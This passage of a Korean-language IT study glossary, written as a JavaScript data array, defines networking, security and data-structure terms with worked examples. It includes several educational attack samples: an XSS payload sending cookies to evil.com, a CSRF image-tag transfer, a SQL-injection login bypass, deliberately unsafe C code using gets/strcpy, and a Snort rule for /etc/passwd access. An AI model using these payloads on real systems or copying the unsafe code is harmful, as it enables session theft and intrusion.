    example: 'DNS 작동 과정:\n1. 사용자가 브라우저에 "example.com" 입력\n2. 컴퓨터가 로컬 DNS 캐시 확인\n3. 로컬 DNS 서버(ISP 제공)에 쿼리\n4. 로컬 DNS 서버가 루트 DNS 서버에 쿼리\n5. 루트 DNS가 TLD(Top-Level Domain) 서버로 안내\n6. TLD 서버가 권한 있는 DNS 서버로 안내\n7. 권한 있는 DNS 서버가 IP 주소 응답\n8. 로컬 DNS 서버가 결과 캐싱 및 사용자에게 반환\n9. 브라우저가 해당 IP 주소로 연결',
    relatedKeywords: ['도메인 이름', 'IP 주소', 'DNS 레코드', 'A 레코드', 'MX 레코드', 'CNAME', '네임서버']
  },
  {
    keyword: 'DHCP',
    description: 'DHCP(Dynamic Host Configuration Protocol)는 네트워크 장치에 IP 주소를 자동으로 할당하고 관리하는 프로토콜입니다. 네트워크 관리자가 수동으로 주소를 할당하는 대신, DHCP 서버가 자동으로 IP 주소 풀에서 할당하고 회수합니다.',
    example: 'DHCP 동작 과정(DORA):\n1. Discover: 클라이언트가 브로드캐스트로 DHCP 서버 탐색\n2. Offer: DHCP 서버가 가용한 IP 주소 제안\n3. Request: 클라이언트가 제안된 IP 주소 요청\n4. Acknowledge: DHCP 서버가 IP 주소 사용 허가 및 추가 네트워크 정보 제공\n\nDHCP 제공 정보: IP 주소, 서브넷 마스크, 기본 게이트웨이, DNS 서버, 임대 기간',
    relatedKeywords: ['IP 주소 할당', '자동 네트워크 구성', 'DORA 프로세스', 'IP 임대', 'DHCP 서버', 'DHCP 클라이언트']
  },
  {
    keyword: 'ARP',
    description: 'ARP(Address Resolution Protocol)는 네트워크 계층의 IP 주소를 데이터 링크 계층의 MAC 주소로 변환하는 프로토콜입니다. 같은 로컬 네트워크 내에서 통신할 때 패킷을 올바른 물리적 장치로 전달하는 데 필수적입니다.',
    example: 'ARP 작동 과정:\n1. 디바이스 A가 디바이스 B의 IP 주소는 알지만 MAC 주소는 모름\n2. A가 네트워크에 브로드캐스트: "192.168.1.10의 MAC 주소는 무엇인가요?"\n3. IP 주소가 192.168.1.10인 디바이스 B만 응답: "제 MAC 주소는 00:1A:2B:3C:4D:5E입니다"\n4. A가 B의 MAC 주소를 ARP 캐시에 저장하고 통신 시작\n\nARP 캐시: IP-MAC 주소 매핑을 임시 저장하는 테이블',
    relatedKeywords: ['MAC 주소', 'IP 주소', '주소 변환', 'ARP 캐시', 'ARP 스푸핑', '네트워크 계층', '데이터 링크 계층']
  },
  {
    keyword: 'ICMP',
    description: 'ICMP(Internet Control Message Protocol)는 네트워크 장치 간에 오류 메시지와 작동 정보를 주고받는 데 사용되는 프로토콜입니다. 주로 네트워크 문제 진단과 라우팅 최적화에 활용됩니다.',
    example: 'ICMP 메시지 유형:\n1. Echo Request/Reply: ping 명령에 사용 (Type 8/0)\n2. Destination Unreachable: 목적지 도달 불가 메시지 (Type 3)\n3. Time Exceeded: TTL(Time To Live) 만료 메시지 (Type 11)\n4. Redirect: 더 나은 경로 제안 메시지 (Type 5)\n\n사용 예시:\n- ping: ICMP Echo Request/Reply를 사용하여 호스트 연결성 테스트\n- traceroute: ICMP와 TTL을 사용하여 경로 추적',
    relatedKeywords: ['ping', 'traceroute', '네트워크 진단', '오류 메시지', 'IP', 'TTL']
  },
  {
    keyword: '라우팅',
    description: '라우팅(Routing)은 네트워크에서 데이터 패킷이 출발지에서 목적지까지 최적의 경로를 결정하고 전달하는 프로세스입니다. 라우터가 라우팅 테이블을 참조하여 패킷을 적절한 다음 홉(next hop)으로 전달합니다.',
    example: '라우팅 프로토콜 유형:\n1. 정적 라우팅: 관리자가 수동으로 경로 설정\n   - route add -net 192.168.2.0/24 gw 192.168.1.1\n\n2. 동적 라우팅: 라우터가 자동으로 경로 학습 및 업데이트\n   - 거리 벡터 프로토콜: RIP(Routing Information Protocol), BGP(Border Gateway Protocol)\n   - 링크 상태 프로토콜: OSPF(Open Shortest Path First), IS-IS\n\n라우팅 테이블 예시:\n목적지 네트워크 | 넥스트 홉 | 인터페이스 | 메트릭\n192.168.2.0/24 | 192.168.1.1 | eth0 | 1\n10.0.0.0/8 | 192.168.1.254 | eth0 | 2',
    relatedKeywords: ['라우터', '라우팅 테이블', '정적 라우팅', '동적 라우팅', 'RIP', 'OSPF', 'BGP', '넥스트 홉']
  },
  {
    keyword: '서브넷팅',
    description: '서브넷팅(Subnetting)은 하나의 큰 네트워크를 여러 개의 작은 네트워크(서브넷)로 분할하는 기술입니다. IP 주소 공간을 효율적으로 활용하고, 네트워크 트래픽을 관리하며, 보안을 강화하는 데 도움이 됩니다.',
    example: '서브넷팅 과정:\n1. 클래스 C 네트워크 192.168.1.0/24를 4개의 서브넷으로 분할하려면\n2. 추가 2비트가 필요 (2^2 = 4)\n3. 서브넷 마스크는 /26 (255.255.255.192)이 됨\n4. 결과 서브넷:\n   - 192.168.1.0/26 (가능한 호스트: 192.168.1.1 - 192.168.1.62)\n   - 192.168.1.64/26 (가능한 호스트: 192.168.1.65 - 192.168.1.126)\n   - 192.168.1.128/26 (가능한 호스트: 192.168.1.129 - 192.168.1.190)\n   - 192.168.1.192/26 (가능한 호스트: 192.168.1.193 - 192.168.1.254)\n\n각 서브넷은 네트워크 주소와 브로드캐스트 주소가 포함됨',
    relatedKeywords: ['IP 주소', '서브넷 마스크', 'CIDR 표기법', '네트워크 세분화', 'IP 클래스', '호스트 비트', '네트워크 비트']
  },
  {
    keyword: 'NAT',
    description: 'NAT(Network Address Translation)는 사설 IP 주소를 공인 IP 주소로 변환하는 기술입니다. 이를 통해 여러 장치가 하나의 공인 IP 주소를 공유하여 인터넷에 접속할 수 있으며, 내부 네트워크 구조를 외부로부터 숨겨 보안을 강화합니다.',
    example: 'NAT 유형:\n1. 정적 NAT: 내부 사설 IP와 외부 공인 IP가 1:1로 매핑됨\n2. 동적 NAT: 내부 사설 IP를 공인 IP 풀에서 동적으로 할당\n3. PAT/NAPT(포트 주소 변환): 여러 사설 IP가 하나의 공인 IP에 다른 포트로 매핑됨(가장 일반적인 형태)\n\nPAT 예시:\n내부: 192.168.1.10:3333 → NAT 라우터 → 외부: 203.0.113.1:5555\n내부: 192.168.1.20:3333 → NAT 라우터 → 외부: 203.0.113.1:6666\n\n이 경우 동일한 소스 포트(3333)를 사용하는 두 내부 호스트가 다른 외부 포트(5555, 6666)로 변환됨',
    relatedKeywords: ['사설 IP', '공인 IP', 'PAT', 'IP 마스커레이딩', 'IPv4 주소 고갈', 'CGNAT', 'NAT 순회']
  },
  {
    keyword: '방화벽',
    description: '방화벽(Firewall)은 네트워크 간의 트래픽을 모니터링하고 제어하는 보안 시스템입니다. 미리 정의된 보안 규칙에 따라 승인된 트래픽만 허용하고 잠재적으로 위험한 트래픽은 차단합니다.',
    example: '방화벽 유형:\n1. 패킷 필터링 방화벽: IP 주소, 포트, 프로토콜 등을 기반으로 패킷 검사\n2. 상태 추적 방화벽: 연결 상태를 추적하여 관련 패킷만 허용\n3. 애플리케이션 방화벽: 애플리케이션 계층에서 작동, 특정 애플리케이션 트래픽 제어\n4. 차세대 방화벽(NGFW): 통합 침입 방지, 심층 패킷 검사, 애플리케이션 인식 기능 제공\n\n방화벽 규칙 예시:\n- 인바운드: 허용 TCP 포트 80, 443 (웹 서비스)\n- 인바운드: 차단 TCP 포트 3389 (원격 데스크톱)\n- 아웃바운드: 허용 TCP 모든 포트 (내부에서 외부로의 연결)',
    relatedKeywords: ['네트워크 보안', '패킷 필터링', '상태 추적', 'ACL', '침입 방지 시스템', 'DMZ', '프록시 방화벽']
  },
  {
    keyword: 'TCP와 UDP 차이',
    description: 'TCP(Transmission Control Protocol)와 UDP(User Datagram Protocol)는 전송 계층의 두 주요 프로토콜로, 데이터 전송 방식과 신뢰성에 차이가 있습니다. TCP는 연결 지향적이고 신뢰성 있는 전송을 제공하며, UDP는 비연결형이고 빠르지만 신뢰성이 낮습니다.',
    example: 'TCP 특징:\n- 연결 지향적 (3-way handshake로 연결 설정)\n- 패킷 순서 보장\n- 패킷 손실 시 재전송\n- 흐름 제어 및 혼잡 제어\n- 헤더 크기: 20-60 바이트\n- 사용 예: 웹 브라우징(HTTP), 이메일(SMTP), 파일 전송(FTP)\n\nUDP 특징:\n- 비연결형 (연결 설정 없음)\n- 패킷 순서 보장 안 함\n- 패킷 손실 시 재전송 없음\n- 흐름 제어 및 혼잡 제어 없음\n- 헤더 크기: 8 바이트 (TCP보다 적은 오버헤드)\n- 사용 예: DNS, 스트리밍 미디어, 온라인 게임, VoIP',
    relatedKeywords: ['전송 계층', '연결 지향', '비연결형', '패킷', '소켓', '포트', '신뢰성', '지연 시간']
  },
  {
    keyword: '전자서명',
    description: '전자서명(Digital Signature)은 디지털 메시지나 문서의 진위성과 무결성을 확인하는 수학적 방법입니다. 발신자의 개인키로 데이터의 해시값을 암호화하여 생성하며, 받는 사람은 발신자의 공개키로 서명을 검증할 수 있습니다.',
    example: '전자서명 생성 및 검증 과정:\n1. 발신자가 문서의 해시값(다이제스트) 생성\n2. 발신자의 개인키로 해시값을 암호화하여 전자서명 생성\n3. 문서와 전자서명을 함께 전송\n4. 수신자가 문서의 해시값을 계산\n5. 발신자의 공개키로 전자서명을 복호화하여 원본 해시값 추출\n6. 두 해시값이 일치하면 서명 검증 성공\n\n전자서명의 기능:\n- 인증(Authentication): 발신자 확인\n- 무결성(Integrity): 데이터 변경 감지\n- 부인방지(Non-repudiation): 발신자의 행위 부인 불가',
    relatedKeywords: ['비대칭키 암호화', 'RSA', '해시함수', '인증서', 'PKI', '무결성', '부인방지']
  },
  {
    keyword: '인증',
    description: '인증(Authentication)은 사용자나 시스템이 자신이 주장하는 신원을 증명하는 프로세스입니다. 신원 확인을 통해 인가된 사용자만 시스템에 접근할 수 있도록 하는 보안의 기본 요소입니다.',
    example: '인증 방식 유형:\n1. 지식 기반(Something you know): 비밀번호, PIN, 보안 질문\n2. 소유 기반(Something you have): 스마트카드, OTP 토큰, 휴대폰\n3. 특성 기반(Something you are): 지문, 홍채, 얼굴 인식(생체 인증)\n4. 위치 기반(Somewhere you are): GPS 위치, 네트워크 위치\n5. 행동 기반(Something you do): 서명 패턴, 키스트로크 역학\n\n다중 인증(MFA): 여러 인증 방식 조합 (예: 비밀번호 + OTP)\n\n인증 프로토콜 예시:\n- OAuth 2.0: 타사 애플리케이션 접근 권한 부여\n- SAML: 조직 간 SSO(Single Sign-On) 제공\n- OpenID Connect: OAuth 2.0 기반 ID 검증 레이어',
    relatedKeywords: ['인가', '비밀번호', '다중 인증(MFA)', '생체 인증', 'OAuth', 'SSO', 'LDAP']
  },
  {
    keyword: 'OAuth',
    description: 'OAuth는 사용자가 비밀번호를 공유하지 않고도 타사 애플리케이션에게 제한된 접근 권한을 부여할 수 있는 개방형 인증 프로토콜입니다. 소셜 미디어 로그인 및 API 인증에 널리 사용됩니다.',
    example: 'OAuth 2.0 인증 흐름(Authorization Code Flow):\n1. 클라이언트가 리소스 소유자(사용자)를 인증 서버로 리디렉션\n2. 사용자가 인증하고 애플리케이션 접근 권한 승인\n3. 인증 서버가 클라이언트에게 인증 코드 발급\n4. 클라이언트가 인증 코드를 액세스 토큰으로 교환\n5. 클라이언트가 액세스 토큰을 사용하여 리소스 서버에서 데이터 접근\n\n주요 용어:\n- 리소스 소유자: 데이터 접근 권한 부여하는 사용자\n- 클라이언트: 접근 권한을 요청하는 애플리케이션\n- 인증 서버: 토큰 발급 및 인증 처리\n- 리소스 서버: 보호된 데이터 제공',
    relatedKeywords: ['인증', 'API 인증', '액세스 토큰', '리프레시 토큰', 'OpenID Connect', '권한 부여', 'OAuth 2.0']
  },
  {
    keyword: 'JWT',
    description: 'JWT(JSON Web Token)는 당사자 간 정보를 JSON 객체로 안전하게 전송하기 위한 컴팩트하고 독립적인 방식을 정의하는 개방형 표준(RFC 7519)입니다. 디지털 서명을 통해 정보의 무결성을 검증할 수 있습니다.',
    example: `JWT 구조 (점으로 구분된 3개 부분):
1. 헤더(Header): 토큰 유형과 서명 알고리즘 명시
   {"alg": "HS256", "typ": "JWT"}

2. 페이로드(Payload): 클레임(사용자 ID, 역할, 만료시간 등) 포함
   {"sub": "1234567890", "name": "홍길동", "role": "admin", "exp": 1516239022}

3. 서명(Signature): 헤더와 페이로드를 인코딩한 후 비밀키로 서명
   HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)

예시 JWT: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U

주요 사용 사례:
- 인증 및 권한 관리
- 정보 교환
- API 인증`,
    relatedKeywords: ['토큰 기반 인증', 'JSON', '인증', '클레임', '무상태(Stateless)', 'OAuth', 'Base64']
  },
  {
    keyword: 'XSS',
    description: 'XSS(Cross-Site Scripting)는 웹 애플리케이션의 취약점을 이용해 사용자 브라우저에 악성 스크립트를 삽입하는 공격입니다. 공격자는 이를 통해 세션 탈취, 악성 사이트로 리디렉션, 콘텐츠 조작 등을 수행할 수 있습니다.',
    example: 'XSS 공격 유형:\n1. 저장형(Stored) XSS: 악성 스크립트가 서버에 저장되어 다른 사용자가 페이지 접근 시 실행\n   예: 게시판에 <script>document.location="https://evil.com/steal.php?cookie="+document.cookie</script> 삽입\n\n2. 반사형(Reflected) XSS: 사용자 입력이 서버 응답에 즉시 반영되어 실행\n   예: http://example.com/search?q=<script>alert("XSS")</script>\n\n3. DOM 기반 XSS: 클라이언트 측 자바스크립트가 취약한 방식으로 DOM 조작\n\n방어 방법:\n- 입력 검증 및 출력 인코딩\n- Content Security Policy(CSP) 적용\n- HttpOnly 쿠키 사용\n- X-XSS-Protection 헤더 설정',
    relatedKeywords: ['웹 보안', '악성 스크립트', '입력 검증', 'CSP', '출력 인코딩', 'OWASP Top 10', 'XSS 필터']
  },
  {
    keyword: 'CSRF',
    description: 'CSRF(Cross-Site Request Forgery)는 사용자가 자신의 의지와 무관하게 공격자가 의도한 행동을 수행하게 하는 공격입니다. 인증된 사용자의 신뢰를 악용하여 권한 있는 작업을 실행합니다.',
    example: 'CSRF 공격 시나리오:\n1. 사용자가 은행 사이트에 로그인하여 인증 쿠키 획득\n2. 로그아웃하지 않고 악성 사이트 방문\n3. 악성 사이트에 다음과 같은 코드 포함:\n   <img src="https://bank.example.com/transfer?to=attacker&amount=1000" width="0" height="0">\n4. 브라우저가 요청 시 자동으로 인증 쿠키 포함\n5. 은행 서버가 유효한 요청으로 인식하여 송금 실행\n\n방어 방법:\n- CSRF 토큰: 각 양식에 고유한 토큰 포함\n- Same-Site 쿠키 속성\n- Origin, Referer 헤더 검증\n- 중요 작업 시 재인증 요구',
    relatedKeywords: ['웹 보안', '세션 하이재킹', '인증 쿠키', 'CSRF 토큰', 'Same-Site 쿠키', 'OWASP Top 10']
  },
  {
    keyword: 'SQL 인젝션',
    description: 'SQL 인젝션은 악의적인 SQL 코드를 웹 애플리케이션의 입력 필드에 삽입하여 데이터베이스를 공격하는 기법입니다. 성공적인 공격은 데이터 유출, 변조, 삭제나 관리자 접근 권한 획득으로 이어질 수 있습니다.',
    example: '기본 SQL 인젝션 예시 (로그인 우회):\n1. 원래 쿼리: SELECT * FROM users WHERE username = \'사용자입력\' AND password = \'사용자입력\'\n2. 악의적인 입력: username = admin\' --\n3. 결과 쿼리: SELECT * FROM users WHERE username = \'admin\' -- AND password = \'사용자입력\'\n   (-- 이후는 주석 처리되어 비밀번호 검증 무시)\n\n공격 유형:\n- UNION 기반: 원래 쿼리에 UNION 키워드로 다른 테이블 데이터 추출\n- 블라인드: 직접적인 출력 없이 참/거짓 응답으로 정보 추출\n- 시간 기반: 쿼리 실행 시간 차이로 정보 추출\n\n방어 방법:\n- 매개변수화된 쿼리(Prepared Statements) 사용\n- 저장 프로시저 호출\n- ORM 프레임워크 활용\n- 입력 검증 및 이스케이핑\n- 최소 권한 원칙 적용',
    relatedKeywords: ['데이터베이스 보안', '쿼리 주입', '매개변수화 쿼리', 'ORM', 'OWASP Top 10', '입력 검증']
  },
  {
    keyword: '버퍼 오버플로우',
    description: '버퍼 오버플로우는 프로그램이 버퍼(임시 데이터 저장소)의 경계를 넘어 데이터를 쓰려고 할 때 발생하는 취약점입니다. 공격자는 이를 이용해 메모리를 손상시키거나 악성 코드를 삽입하여 실행할 수 있습니다.',
    example: '스택 버퍼 오버플로우 예시(C 언어):\n```c\nvoid vulnerable_function(char *input) {\n    char buffer[16]; // 16바이트 버퍼 할당\n    strcpy(buffer, input); // 길이 검사 없이 복사\n}\n\nint main() {\n    char user_input[100];\n    gets(user_input); // 안전하지 않은 입력 함수\n    vulnerable_function(user_input);\n    return 0;\n}\n```\n\n공격 시, 16바이트보다 큰 입력으로 반환 주소를 덮어써 실행 흐름 변경 가능\n\n방어 방법:\n- 경계 검사 수행 (strncpy 같은 안전한 함수 사용)\n- ASLR(주소 공간 배치 무작위화)\n- DEP/NX(데이터 실행 방지)\n- 스택 가드/카나리\n- 안전한 컴파일러 옵션 사용',
    relatedKeywords: ['메모리 안전', '스택 오버플로우', '힙 오버플로우', '쉘코드', 'ASLR', 'DEP/NX', '스택 카나리']
  },
  {
    keyword: 'DDoS',
    description: 'DDoS(Distributed Denial of Service)는 분산 서비스 거부 공격으로, 여러 감염된 시스템을 이용해 대상 시스템이나 네트워크의 리소스를 고갈시켜 서비스를 중단시키는 공격입니다.',
    example: 'DDoS 공격 유형:\n1. 볼륨 기반 공격: 대역폭 소진\n   - UDP 플러드: 대량의 UDP 패킷으로 포트 포화\n   - ICMP 플러드: 핑(Ping) 요청 폭주\n   - Amplification: DNS, NTP 등의 증폭 요소 이용\n\n2. 프로토콜 공격: 서버 리소스 소진\n   - SYN 플러드: TCP 연결 설정 요청 후 완료하지 않음\n   - Fragmented packet: 조각화된 패킷으로 재조립 자원 소모\n\n3. 애플리케이션 계층 공격: 애플리케이션 취약점 공격\n   - HTTP 플러드: GET/POST 요청 폭주\n   - Slowloris: 불완전한 HTTP 요청으로 연결 유지\n\n방어 방법:\n- 트래픽 필터링 및 클린징\n- 로드 밸런싱\n- 엣지 네트워크/CDN 활용\n- 트래픽 패턴 분석 및 이상 탐지\n- 대역폭 확장(Overprovision)',
    relatedKeywords: ['서비스 거부 공격', '봇넷', 'SYN 플러드', 'HTTP 플러드', 'Amplification 공격', 'CDN', 'WAF']
  },
  {
    keyword: 'IDS/IPS',
    description: 'IDS(침입 탐지 시스템)와 IPS(침입 방지 시스템)는 네트워크 또는 시스템에 대한 악의적인 활동을 모니터링하고 탐지하는 보안 도구입니다. IDS는 탐지만 하고 알림을 주는 반면, IPS는 추가로 이러한 활동을 차단하거나 방지하는 기능을 수행합니다.',
    example: `IDS/IPS 유형:
1. 네트워크 기반(NIDS/NIPS): 네트워크 트래픽 분석
2. 호스트 기반(HIDS/HIPS): 개별 호스트의 활동 모니터링

탐지 방법:
1. 시그니처 기반: 알려진 공격 패턴 매칭
   - 예: Snort 규칙 "alert tcp any any -> 192.168.1.0/24 80 (content:"/etc/passwd"; msg:"웹을 통한 패스워드 파일 접근 시도";)"
2. 이상 행동 기반: 정상 상태에서 벗어난 행동 탐지
3. 정책 기반: 정의된 정책 위반 감지
4. 휴리스틱 분석: 동작 패턴 학습 및 분석

IDS와 IPS 비교:
- IDS: 수동적, 탐지 후 알림만 제공 (네트워크 성능 영향 적음)
- IPS: 능동적, 탐지 및 자동 대응 (네트워크 지연 가능성)`,
    relatedKeywords: ['네트워크 보안', '악성 트래픽 탐지', '침입 탐지', '침입 방지', '시그니처 기반 탐지', '이상 행동 탐지', 'Snort', 'Suricata']
  },
  {
    keyword: 'SSL/TLS',
    description: 'SSL(Secure Sockets Layer)과 TLS(Transport Layer Security)는 네트워크 통신을 암호화하여 보안을 제공하는 프로토콜입니다. SSL은 더 이상 사용되지 않고 TLS로 대체되었지만, 용어는 여전히 혼용됩니다.',
    example: 'TLS 핸드셰이크 과정:\n1. 클라이언트 헬로: 클라이언트가 지원하는 암호화 알고리즘과 랜덤 데이터 전송\n2. 서버 헬로: 서버가 선택한 암호화 알고리즘, 랜덤 데이터, 인증서 전송\n3. 인증서 검증: 클라이언트가 서버 인증서 검증\n4. 키 교환: 클라이언트가 프리마스터 시크릿 생성 및 전송 (RSA 또는 DH/ECDHE)\n5. 세션 키 생성: 양측이 동일한 방식으로 마스터 시크릿과 세션 키 생성\n6. 암호화 통신 시작: 세션 키로 데이터 암호화하여 통신\n\nTLS 버전:\n- SSL 3.0: 취약점 발견으로 사용 중단\n- TLS 1.0/1.1: 보안 취약점으로 사용 권장하지 않음\n- TLS 1.2: 널리 사용됨\n- TLS 1.3: 최신 버전, 향상된 성능과 보안성(핸드셰이크 단순화)',
    relatedKeywords: ['암호화 통신', 'HTTPS', '인증서', 'PKI', '공개키 암호화', '세션 키', 'Perfect Forward Secrecy']
  },
  {
    keyword: '자료구조',
    description: '자료구조(Data Structure)는 데이터를 효율적으로 저장, 관리, 접근하기 위한 논리적 구조입니다. 문제 해결에 적합한 자료구조 선택은 알고리즘의 성능과 효율성에 직접적인 영향을 미칩니다.',
    example: '기본 자료구조 유형:\n1. 선형 구조\n   - 배열(Array): 연속된 메모리 공간에 동일한 타입의 데이터 저장\n   - 연결 리스트(Linked List): 노드와 포인터로 구성된 순차적 데이터 구조\n   - 스택(Stack): LIFO(Last In First Out) 구조로 가장 최근에 추가된 항목이 먼저 제거됨\n   - 큐(Queue): FIFO(First In First Out) 구조로 가장 먼저 추가된 항목이 먼저 제거됨\n\n2. 비선형 구조\n   - 트리(Tree): 계층적 구조의 노드와 간선으로 구성\n   - 그래프(Graph): 노드와 노드 간 연결(간선)을 가진 구조\n   - 힙(Heap): 완전 이진 트리 형태로 특정 순서 속성을 가짐\n   - 해시 테이블(Hash Table): 키-값 쌍을 저장하는 구조로 O(1) 검색 가능',
    relatedKeywords: ['알고리즘', '시간복잡도', '공간복잡도', '배열', '연결 리스트', '트리', '그래프', '해시 테이블']
  },
  {
    keyword: '스택',
    description: '스택(Stack)은 LIFO(Last In First Out) 원칙을 따르는 선형 자료구조로, 데이터는 한쪽 끝(top)에서만 삽입하고 제거할 수 있습니다. 함수 호출 관리, 수식 계산, 구문 분석 등에 활용됩니다.',
    example: '스택 기본 연산:\n- push(item): 스택의 맨 위에 항목 추가\n- pop(): 스택의 맨 위 항목 제거 및 반환\n- peek()/top(): 스택의 맨 위 항목 반환 (제거하지 않음)\n- isEmpty(): 스택이 비어있는지 확인\n\n스택 구현 예시(JavaScript):\n```javascript\nclass Stack {\n  constructor() {\n    this.items = [];\n  }\n  \n  push(item) {\n    this.items.push(item);\n  }\n  \n  pop() {\n    if (this.isEmpty()) return "Underflow";\n    return this.items.pop();\n  }\n  \n  peek() {\n    return this.items[this.items.length - 1];\n  }\n  \n  isEmpty() {\n    return this.items.length === 0;\n  }\n}\n```\n\n활용 사례:\n- 함수 호출 스택 관리\n- 괄호 짝 맞추기\n- 후위 표기법(Postfix) 계산\n- 웹 브라우저 방문 기록\n- DFS(깊이 우선 탐색)',
    relatedKeywords: ['LIFO', '자료구조', '후위 표기법', '함수 호출 스택', '백트래킹', '괄호 검사']
  },
  {
    keyword: '큐',
    description: '큐(Queue)는 FIFO(First In First Out) 원칙을 따르는 선형 자료구조로, 한쪽 끝(rear)에서는 삽입만, 다른 한쪽 끝(front)에서는 제거만 수행합니다. 대기열 관리, 버퍼링, 작업 스케줄링 등에 활용됩니다.',
    example: '큐 기본 연산:\n- enqueue(item): 큐의 뒤쪽에 항목 추가\n- dequeue(): 큐의 앞쪽에서 항목 제거 및 반환\n- peek()/front(): 큐의 앞쪽 항목 반환 (제거하지 않음)\n- isEmpty(): 큐가 비어있는지 확인\n\n큐 구현 예시(Python):\n```python\nclass Queue:\n  def __init__(self):\n    self.items = []\n    \n  def enqueue(self, item):\n    self.items.append(item)\n    \n  def dequeue(self):\n    if self.is_empty():\n      return "Underflow"\n    return self.items.pop(0)\n    \n  def front(self):\n    if self.is_empty():\n      return "Queue is empty"\n    return self.items[0]\n    \n  def is_empty(self):\n    return len(self.items) == 0\n```\n\n큐의 변형:\n- 원형 큐(Circular Queue): 메모리 효율성 향상\n- 우선순위 큐(Priority Queue): 우선순위에 따라 요소 제거\n- 덱(Deque, Double-ended Queue): 양쪽 끝에서 삽입/삭제 가능\n\n활용 사례:\n- BFS(너비 우선 탐색)\n- 작업 스케줄링\n- 프린터 대기열\n- 메시지 큐\n- 네트워크 패킷 처리',
    relatedKeywords: ['FIFO', '자료구조', 'BFS', '원형 큐', '우선순위 큐', '덱', '버퍼링']
  },
  {
    keyword: '힙',
    description: '힙(Heap)은 완전 이진 트리 기반의 자료구조로, 부모 노드와 자식 노드 간에 특정 순서 관계를 만족합니다. 최대 힙은 부모가 자식보다 크거나 같고, 최소 힙은 부모가 자식보다 작거나 같습니다. 주로 우선순위 큐 구현에 사용됩니다.',
    example: '힙 특성:\n- 완전 이진 트리 구조\n- 최대 힙(Max Heap): 모든 부모 노드 값 ≥ 자식 노드 값\n- 최소 힙(Min Heap): 모든 부모 노드 값 ≤ 자식 노드 값\n- 배열로 표현 가능: 노드 i의 부모 = (i-1)/2, 좌측 자식 = 2i+1, 우측 자식 = 2i+2\n\n힙 기본 연산:\n- insert(value): 힙에 값 삽입 (O(log n))\n- extractMax()/extractMin(): 루트 노드 제거 및 반환 (O(log n))\n- peek(): 루트 노드 반환 (O(1))\n\n힙 정렬(Heap Sort) 단계:\n1. 배열을 힙으로 구성(heapify)\n2. 루트(최대/최소값)을 추출하여 정렬된 부분에 배치\n3. 나머지 요소로 힙 재구성\n4. 모든 요소가 정렬될 때까지 2-3 반복\n\n활용 사례:\n- 우선순위 큐 구현\n- 힙 정렬\n- 그래프 알고리즘(다익스트라, 프림 등)\n- 중앙값 찾기(이중 힙 사용)',
    relatedKeywords: ['우선순위 큐', '완전 이진 트리', '최대 힙', '최소 힙', '힙 정렬', 'heapify', '이진 힙']
  },
  {
    keyword: '해시테이블',
    description: '해시테이블(Hash Table)은 키-값 쌍을 저장하는 자료구조로, 해시 함수를 사용하여 키를 배열 인덱스로 변환합니다. 이상적인 경우 O(1) 시간에 검색, 삽입, 삭제가 가능하여 매우 효율적입니다.',
    example: '해시테이블 동작:\n1. 키에 해시 함수 적용하여 해시 값(인덱스) 생성\n2. 해시 값을 사용하여 배열에서 위치 결정\n3. 해당 위치에 값 저장 또는 검색\n\n충돌 해결 방법:\n1. 체이닝(Chaining): 동일 인덱스에 연결 리스트로 여러 항목 저장\n2. 개방 주소법(Open Addressing):\n   - 선형 탐사(Linear Probing): 충돌 시 순차적으로 다음 슬롯 검사\n   - 이차 탐사(Quadratic Probing): 충돌 시 제곱 간격으로 슬롯 검사\n   - 이중 해싱(Double Hashing): 두 번째 해시 함수 사용하여 다음 위치 결정\n\n해시테이블 성능:\n- 평균 시간복잡도: O(1) (검색, 삽입, 삭제)\n- 최악 시간복잡도: O(n) (많은 충돌 발생 시)\n- 공간복잡도: O(n)\n\n해시 함수 예시:\n- Division Method: h(k) = k % m\n- Multiplication Method: h(k) = ⌊m(kA mod 1)⌋, 0<A<1\n- Universal Hashing: 충돌 가능성 최소화\n\n활용 사례:\n- 사전 구현\n- 데이터베이스 인덱싱\n- 캐싱\n- 집합 표현',
    relatedKeywords: ['해시 함수', '충돌', '체이닝', '개방 주소법', '로드 팩터', '재해싱', 'Map', 'Dictionary']
  },
  {
    keyword: '트리',
    description: '트리(Tree)는 계층적 구조를 나타내는 비선형 자료구조로, 노드(node)와 간선(edge)으로 구성됩니다. 각 노드는 부모-자식 관계를 가지며, 사이클이 없는 연결 그래프입니다.',
    example: '트리 용어:\n- 루트(Root): 트리의 최상위 노드\n- 부모(Parent): 직접 연결된 위쪽 노드\n- 자식(Child): 직접 연결된 아래쪽 노드\n- 형제(Sibling): 같은 부모를 가진 노드\n- 리프(Leaf): 자식이 없는 노드\n- 깊이(Depth): 루트에서 노드까지의 경로 길이\n- 높이(Height): 가장 깊은 노드까지의 경로 길이\n\n트리 순회 방법:\n- 전위 순회(Preorder): 노드 → 좌측 서브트리 → 우측 서브트리\n- 중위 순회(Inorder): 좌측 서브트리 → 노드 → 우측 서브트리\n- 후위 순회(Postorder): 좌측 서브트리 → 우측 서브트리 → 노드\n- 레벨 순회(Level-order): 각 레벨별로 왼쪽에서 오른쪽으로\n\n트리 유형:\n- 이진 트리(Binary Tree): 최대 2개의 자식 노드\n- 이진 탐색 트리(BST): 좌측 자식 ≤ 부모 ≤ 우측 자식\n- 균형 트리(Balanced Tree): 높이를 최소화한 트리(AVL, Red-Black)\n- 힙(Heap): 완전 이진 트리로 특정 순서 속성을 가짐\n- B-트리: 디스크 접근 최적화를 위한 다분기 트리\n\n활용 사례:\n- 계층 데이터 표현\n- 데이터베이스 인덱싱\n- 구문 분석\n- 의사결정 시스템\n- 파일 시스템',
    relatedKeywords: ['이진 트리', '이진 탐색 트리', 'AVL 트리', '레드-블랙 트리', '트리 순회', 'B-트리', '계층 구조']
  },
  {
    keyword: '그래프',
    description: '그래프(Graph)는 정점(노드)과 간선으로 구성된 비선형 자료구조로, 객체 간의 관계를 표현합니다. 네트워크, 경로 문제, 소셜 연결 등 다양한 실세계 문제를 모델링하는 데 활용됩니다.',
